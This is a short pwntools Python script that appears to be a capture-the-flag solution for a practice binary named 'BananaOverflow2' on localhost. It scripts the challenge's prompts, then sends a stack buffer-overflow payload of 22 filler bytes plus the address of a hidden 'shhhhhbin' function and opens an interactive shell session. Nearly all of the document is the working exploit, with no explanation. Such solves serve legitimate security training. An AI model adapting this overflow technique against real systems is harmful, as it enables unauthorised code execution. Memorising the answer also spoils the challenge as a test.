from pwn import *

e = ELF('BananaOverflow2')
p = e.process()
p = remote('localhost',6666)



p.recvuntil("banana!")
p.recvline()

while(True):
	f = p.recvline().decode('ascii')
	print(f)
	if(f == "You either know it or you don't\n"):
		p.sendline("123456789abcdefghi")
		print("made it to first if")
		print(p.recvline())
	elif(f[:4] == "what"):
		fSplit = f.split()
		mySum = int(fSplit[2]) + int(fSplit[4])
		p.sendline(str(mySum))
		print("made it to Second if")
		print(p.recvline())
	elif(f[:4] == "This"):
		print("made it here")
		p.sendline(b"A" * 22  + p64(e.sym['shhhhhbin']))
		p.interactive()

#p.sendline(b"A" * 22  + p64(e.sym['shhhhhbin']))
#print(b"A" * 22  + p64(e.sym['shhhhhbin']))
# this is a local execution solve
#p.interactive()